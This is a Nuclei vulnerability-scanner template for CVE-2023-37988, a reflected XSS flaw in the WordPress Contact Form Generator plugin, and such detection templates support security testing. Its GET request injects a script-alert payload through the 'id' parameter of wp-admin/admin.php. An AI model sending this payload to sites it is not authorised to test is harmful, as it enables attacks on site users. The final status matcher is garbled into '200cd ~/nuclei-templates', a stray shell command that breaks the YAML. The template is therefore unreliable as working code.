id: CVE-2023-37988

info:
  name: Contact Form Generator <= 2.5.5 - Unauthenticated Reflected Cross-Site Scripting
  author: vats147
  severity: medium
  description: |
    The Contact Form Generator plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the 'id' parameter in wp-admin/admin.php in versions up to, and including, 2.5.5 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.
  remediation: Update to plugin version 2.5.6 or later.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/b8c02f87-ba64-4a04-b2a5-1a5c5c5e5e5e
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37988
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-37988
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 1
    vendor: contact-form-generator
    product: contact-form-generator
  tags: cve,cve2023,wordpress,xss,contact-form-generator,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=contact_form_generator&id=1%3Cscript%3Ealert(document.domain)%3C/script%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"

      - type: word
        part: body
        words:
          - "contact_form_generator"

      - type: status
        status:
          - 200cd ~/nuclei-templates
          